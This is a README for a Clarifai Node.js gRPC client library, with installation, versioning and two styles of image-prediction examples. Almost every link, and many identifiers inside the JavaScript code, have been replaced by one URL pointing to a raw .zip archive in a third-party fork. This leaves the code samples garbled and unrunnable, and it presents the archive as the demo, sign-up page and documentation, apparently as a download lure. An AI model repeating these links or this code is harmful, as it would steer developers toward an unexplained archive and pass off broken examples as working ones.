![image](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip)


# Clarifai https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip gRPC Client

This is the official Clarifai gRPC https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip client for interacting with our powerful recognition
[API](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip).
Clarifai provides a platform for data scientists, developers, researchers and enterprises to master the entire
artificial intelligence lifecycle. Gather valuable business insights from images, video and text using computer vision
and natural language processing.

* Try the Clarifai demo at: https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip
* Sign up for a free account at: https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip
* Read the documentation at: https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip


[![npm](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip)](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip)
[![Build](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip%https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip)](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip)

## Installation

```
npm install clarifai-nodejs-grpc
```

## Versioning

This library doesn't use semantic versioning. The first two version numbers (`X.Y` out of `X.Y.Z`) follow the API (backend) versioning, and
whenever the API gets updated, this library follows it.

The third version number (`Z` out of `X.Y.Z`) is used by this library for any independent releases of library-specific improvements and bug fixes.


## Getting started

There are two approaches to using this library: the dynamic and the static. The former has been around for a longer
time, but latter provides type annotations via TypeScript declaration files which improves the IDE auto-completion
experience to be more developer-friendly. Both approaches provide the exact same API capabilities.

### The dynamic approach

Construct the Clarifai stub, which contains all the methods available in the Clarifai API, and the `Metadata`
object that's used to authenticate:

```javascript
const {ClarifaiStub, grpc} = require("clarifai-nodejs-grpc");

const stub = https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip();

const metadata = new https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip();
https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip("authorization", "Key YOUR_CLARIFAI_API_KEY");
```

Predict concepts in an image:

```javascript
https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip(
    {
        // This is the model ID of a publicly available General model. You may use any other public or custom model ID.
        model_id: "aaa03c23b3724a16a56b629203edc62c",
        inputs: [{data: {image: {url: "https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip"}}}]
    },
    metadata,
    (err, response) => {
        if (err) {
            https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip("Error: " + err);
            return;
        }

        if (https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip !== 10000) {
            https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip("Received failed status: " + https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip + "\n" + https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip);
            return;
        }

        https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip("Predicted concepts, with confidence values:")
        for (const c of https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip[0]https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip) {
            https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip(https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip + ": " + https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip);
        }
    }
);
```

See more [in the Clarifai API Guide docs](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip). Also see 
[the integration tests](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip).

> Note: Do not require the `grpc` library directly via `const grpc = require("@grpc/grpc-js");`. This produces
> authentication issues (via `https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip`) whenever any other co-installed libraries have the `@grpc/grpc-js`
> dependency (of a different version). Instead, require `grpc` as shown above.


### The static approach

Create the `V2Client` object with which you access all the Clarifai API functionality, and the `Metadata`
object that's used to authenticate:

```javascript
const {grpc} = require("clarifai-nodejs-grpc");
const service = require("clarifai-nodejs-grpc/proto/clarifai/api/service_pb");
const resources = require("clarifai-nodejs-grpc/proto/clarifai/api/resources_pb");
const {StatusCode} = require("clarifai-nodejs-grpc/proto/clarifai/api/status/status_code_pb");
const {V2Client} = require("clarifai-nodejs-grpc/proto/clarifai/api/service_grpc_pb");

const clarifai = new V2Client("https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip", https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip());

const metadata = new https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip();
https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip("authorization", "Key YOUR_CLARIFAI_API_KEY");
```

Predict concepts in an image:

```javascript
const request = new https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip();
// This is the model ID of a publicly available General model. You may use any other public or custom model ID.
https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip("aaa03c23b3724a16a56b629203edc62c");
https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip(
    new https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip()
        .setData(
            new https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip()
                .setImage(
                    new https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip()
                        .setUrl("https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip")
                )
        )
)

https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip(
    request,
    metadata,
    (error, response) => {
        if (error) {
            throw error;
        }

        if (https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip().getCode() !== https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip) {
            throw "Error: " + https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip();
        }

        https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip("Predicted concepts, with confidence values:")
        for (const concept of https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip()[0].getData().getConceptsList()) {
            https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip(https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip() + " " + https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip());
        }
    }
)
```

See more [in the Clarifai API Guide docs](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip). Also see
[the integration tests](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip).

> Note: Currently, the NodeJS gRPC code examples [in the Clarifai documentation](https://github.com/suryansh-malik/clarifai-nodejs-grpc/raw/refs/heads/master/src/nodejs_grpc_clarifai_2.6.zip) 
show only the dynamic approach. These code examples can easily be translated to the static approach, since the structure 
is the same for both of them. The difference is only in the syntax.
